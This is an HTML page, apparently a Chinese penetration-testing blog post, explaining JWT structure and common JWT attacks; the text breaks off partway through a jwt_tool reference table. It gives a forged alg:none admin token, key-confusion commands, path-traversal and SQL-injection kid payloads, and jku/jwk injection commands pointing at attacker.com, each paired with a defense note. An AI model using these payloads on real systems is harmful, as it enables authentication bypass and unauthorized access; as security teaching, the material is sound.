@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言JSON Web Token（JWT）是现代Web应用中最广泛使用的身份认证和授权机制之一，采用紧凑的、自包含的JSON格式在各方之间安全传输声明（claims）。然而正因其广泛使用，JWT也成为攻击者的重点关注对象。本文深入探讨JWT的底层结构、常见攻击面及利用手法，并提供渗透测试中可操作的工具指南。  一、JWT结构解析一个JWT由三部分组成，以点号（.）分隔：header.payload">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JWT安全深度解析">
+<meta property="og:url" content="https://congliang.github.io/JWT-attacks/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言JSON Web Token（JWT）是现代Web应用中最广泛使用的身份认证和授权机制之一，采用紧凑的、自包含的JSON格式在各方之间安全传输声明（claims）。然而正因其广泛使用，JWT也成为攻击者的重点关注对象。本文深入探讨JWT的底层结构、常见攻击面及利用手法，并提供渗透测试中可操作的工具指南。  一、JWT结构解析一个JWT由三部分组成，以点号（.）分隔：header.payload">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.917Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="认证安全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/JWT-attacks/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/JWT-attacks/","path":"JWT-attacks/","title":"JWT安全深度解析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JWT安全深度解析 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81JWT%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">一、JWT结构解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-Header%EF%BC%88%E5%A4%B4%E9%83%A8%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 Header（头部）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-Payload%EF%BC%88%E8%BD%BD%E8%8D%B7%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 Payload（载荷）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-Signature%EF%BC%88%E7%AD%BE%E5%90%8D%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 Signature（签名）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-JWT%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">2.4.</span> <span class="nav-text">1.4 JWT工作流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%B8%B8%E8%A7%81JWT%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">二、常见JWT攻击手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-None%E7%AE%97%E6%B3%95%E7%BB%95%E8%BF%87"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 None算法绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-HMAC-RSA%E5%AF%86%E9%92%A5%E6%B7%B7%E6%B7%86%E6%94%BB%E5%87%BB"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 HMAC&#x2F;RSA密钥混淆攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-kid%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 kid头部注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-JKU-JWK%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">3.4.</span> <span class="nav-text">2.4 JKU&#x2F;JWK头部注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98"><span class="nav-number">4.</span> <span class="nav-text">三、渗透测试工具实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-jwt-tool-%E6%A0%B8%E5%BF%83%E7%94%A8%E6%B3%95"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 jwt_tool 核心用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-Burp-Suite-%E2%80%94-JWT-Editor"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 Burp Suite — JWT Editor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E5%85%B6%E4%BB%96%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 其他辅助工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81JWT-Payload%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">5.</span> <span class="nav-text">四、JWT Payload敏感信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%B8%B8%E8%A7%81%E6%B3%84%E9%9C%B2%E5%9C%BA%E6%99%AF"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 常见泄露场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BB%B7%E5%80%BC"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 信息收集价值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 加固建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E9%98%B2%E5%BE%A1%E5%8A%A0%E5%9B%BAChecklist"><span class="nav-number">6.</span> <span class="nav-text">五、防御加固Checklist</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">7.</span> <span class="nav-text">结语</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">8.</span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">9.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/JWT-attacks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JWT安全深度解析 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JWT安全深度解析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-07-15 08:00:00" itemprop="dateCreated datePublished" datetime="2026-07-15T08:00:00+08:00">2026-07-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JSON Web Token（JWT）是现代Web应用中最广泛使用的身份认证和授权机制之一，采用紧凑的、自包含的JSON格式在各方之间安全传输声明（claims）。然而正因其广泛使用，JWT也成为攻击者的重点关注对象。本文深入探讨JWT的底层结构、常见攻击面及利用手法，并提供渗透测试中可操作的工具指南。</p>
+<hr>
+<h2 id="一、JWT结构解析"><a href="#一、JWT结构解析" class="headerlink" title="一、JWT结构解析"></a>一、JWT结构解析</h2><p>一个JWT由三部分组成，以点号（<code>.</code>）分隔：<strong>header.payload.signature</strong></p>
+<h3 id="1-1-Header（头部）"><a href="#1-1-Header（头部）" class="headerlink" title="1.1 Header（头部）"></a>1.1 Header（头部）</h3><p>头部包含算法（<code>alg</code>）和令牌类型（<code>typ</code>）两个字段：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>常见签名算法：</p>
+<ul>
+<li><strong>HS256</strong>：基于共享密钥的对称算法</li>
+<li><strong>RS256</strong>：基于公私钥对的非对称算法</li>
+<li><strong>ES256</strong>：基于椭圆曲线的非对称算法</li>
+<li><strong>none</strong>：无签名（绝不应在生产环境使用）</li>
+</ul>
+<h3 id="1-2-Payload（载荷）"><a href="#1-2-Payload（载荷）" class="headerlink" title="1.2 Payload（载荷）"></a>1.2 Payload（载荷）</h3><p>载荷包含关于实体（通常是用户）的声明数据：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1516239022</span><span class="punctuation">,</span> <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1516242622</span><span class="punctuation">,</span> <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Registered claims</strong>：预定义声明，如 <code>iss</code>（签发者）、<code>sub</code>（主题）、<code>exp</code>（过期时间）</li>
+<li><strong>Private claims</strong>：双方协商使用的自定义声明</li>
+</ul>
+<h3 id="1-3-Signature（签名）"><a href="#1-3-Signature（签名）" class="headerlink" title="1.3 Signature（签名）"></a>1.3 Signature（签名）</h3><p>签名验证消息未被篡改，并验证发送方身份：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># HMAC: HMACSHA256(base64(header) + &quot;.&quot; + base64(payload), secret)</span><br><span class="line"># RSA:  RSASHA256(base64(header) + &quot;.&quot; + base64(payload), pubKey, privKey)</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-JWT工作流程"><a href="#1-4-JWT工作流程" class="headerlink" title="1.4 JWT工作流程"></a>1.4 JWT工作流程</h3><pre class="mermaid">flowchart TD
+    A[客户端登录]-->B[服务端验证凭据]
+    B-->C[构建Header+Payload]
+    C-->D[密钥签名]
+    D-->E[返回JWT给客户端]
+    E-->F[后续请求携带JWT]
+    F-->G[服务端验证签名]
+    G-->H{有效?}
+    H-->|是|I[解析授权]
+    H-->|否|J[401拒绝]</pre>
+
+<hr>
+<h2 id="二、常见JWT攻击手法"><a href="#二、常见JWT攻击手法" class="headerlink" title="二、常见JWT攻击手法"></a>二、常见JWT攻击手法</h2><h3 id="2-1-None算法绕过"><a href="#2-1-None算法绕过" class="headerlink" title="2.1 None算法绕过"></a>2.1 None算法绕过</h3><p><strong>原理</strong>：JWT标准支持 <code>alg: &quot;none&quot;</code> 表示不签名。若JWT库未严格校验算法白名单，当遇到 <code>alg: &quot;none&quot;</code> 时会直接跳过签名验证。</p>
+<p><strong>攻击步骤</strong>：</p>
+<ol>
+<li>获取有效JWT，将header中 <code>alg</code> 改为 <code>none</code></li>
+<li>修改payload中权限字段（如 <code>admin: true</code>）</li>
+<li>移除signature部分，保留末尾点号</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解码原始JWT header</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line"><span class="comment"># 输出: &#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造none算法JWT</span></span><br><span class="line"><span class="comment"># header: &#123;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125; =&gt; eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</span></span><br><span class="line"><span class="comment"># payload: &#123;&quot;sub&quot;:&quot;admin&quot;,&quot;admin&quot;:true&#125; =&gt; eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ</span></span><br><span class="line"><span class="comment"># 最终JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>防御</strong>：在JWT验证库中显式禁用 <code>none</code> 算法，维护算法白名单。</p>
+<h3 id="2-2-HMAC-RSA密钥混淆攻击"><a href="#2-2-HMAC-RSA密钥混淆攻击" class="headerlink" title="2.2 HMAC&#x2F;RSA密钥混淆攻击"></a>2.2 HMAC&#x2F;RSA密钥混淆攻击</h3><p><strong>原理</strong>：当服务器使用RSA公钥验证 <code>RS256</code> JWT时，攻击者可将算法切换为 <code>HS256</code>，并利用<strong>公开的RSA公钥</strong>作为HMAC共享密钥进行签名。由于公钥通常可通过 <code>/.well-known/jwks.json</code> 等途径获取，攻击路径可行。</p>
+<pre class="mermaid">flowchart LR
+    A[获取公钥]-->B[alg改为HS256]
+    B-->C[公钥作HMAC密钥签名]
+    C-->D[发送伪造JWT]
+    D-->E{库区分算法类型?}
+    E-->|未区分|F[验证通过]
+    E-->|严格区分|G[拒绝]</pre>
+
+<p><strong>攻击命令</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提取服务端公钥</span></span><br><span class="line">curl -s https://target.com/.well-known/jwks.json | jq -r <span class="string">&#x27;.keys[0].x5c[0]&#x27;</span> \</span><br><span class="line">  | <span class="built_in">base64</span> -d | openssl x509 -inform der -pubkey -noout &gt; pubkey.pem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用jwt_tool进行密钥混淆攻击</span></span><br><span class="line">python3 jwt_tool.py &lt;JWT&gt; -X k -pk pubkey.pem</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御</strong>：JWT库必须严格区分对称算法（HS系列）和非对称算法（RS&#x2F;ES系列）的密钥类型。</p>
+<h3 id="2-3-kid头部注入"><a href="#2-3-kid头部注入" class="headerlink" title="2.3 kid头部注入"></a>2.3 kid头部注入</h3><p><strong>原理</strong>：<code>kid</code>（Key ID）字段指示验证签名所用的密钥。部分实现将其直接拼接到文件路径读取密钥，若未过滤特殊字符，可触发路径遍历。</p>
+<p><strong>攻击场景一 — 路径遍历</strong>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../../../etc/passwd&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>将 <code>/etc/passwd</code> 内容作为HMAC密钥签名，或读取 <code>/dev/null</code> 后用空字符串签名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py &lt;JWT&gt; -I -pc admin -pv <span class="literal">true</span> -S hs256 -p <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击场景二 — SQL注入</strong>（当 <code>kid</code> 用于数据库查询时）：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&#x27; UNION SELECT &#x27;hacked&#x27;--&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>防御</strong>：对 <code>kid</code> 值做白名单校验，禁止 <code>../</code> 等特殊字符，使用密钥映射表而非路径拼接。</p>
+<h3 id="2-4-JKU-JWK头部注入"><a href="#2-4-JKU-JWK头部注入" class="headerlink" title="2.4 JKU&#x2F;JWK头部注入"></a>2.4 JKU&#x2F;JWK头部注入</h3><p><strong>原理</strong>：<code>jku</code> 指向一个JWKS端点URL，<code>jwk</code> 直接在header嵌入公钥。若服务端信任这些字段，攻击者可注入自控密钥。</p>
+<p><strong>jku攻击</strong>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;jku&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://attacker.com/jwks.json&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>jwk攻击</strong>——直接在header嵌入攻击者生成的公钥：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jwk&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0vx7ag...攻击者模数...&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用命令</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># jku注入：托管恶意jwks.json，指向攻击者URL</span></span><br><span class="line">python3 jwt_tool.py &lt;JWT&gt; -X s -u https://attacker.com/jwks.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># jwk注入：自动生成密钥对并嵌入header</span></span><br><span class="line">python3 jwt_tool.py &lt;JWT&gt; -X i</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御</strong>：禁用 <code>jku</code>&#x2F;<code>jwk</code> header，或维护可信jku域名白名单；始终使用服务端预配置密钥。</p>
+<hr>
+<h2 id="三、渗透测试工具实战"><a href="#三、渗透测试工具实战" class="headerlink" title="三、渗透测试工具实战"></a>三、渗透测试工具实战</h2><h3 id="3-1-jwt-tool-核心用法"><a href="#3-1-jwt-tool-核心用法" class="headerlink" title="3.1 jwt_tool 核心用法"></a>3.1 jwt_tool 核心用法</h3><p><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">jwt_tool</a> 是最全面的JWT渗透测试工具，覆盖漏洞扫描、篡改、签名绕过和密钥攻击。</p>
+<p><strong>安装</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ticarpi/jwt_tool.git &amp;&amp; <span class="built_in">cd</span> jwt_tool</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>模式速查表</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>模式</th>
+<th>功能</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>解码</td>
+<td>查看JWT内容</td>
+<td><code>python3 jwt_tool.py &lt;JWT&gt;</code></td>
+</tr>
+<tr>
+<td>扫描</td>
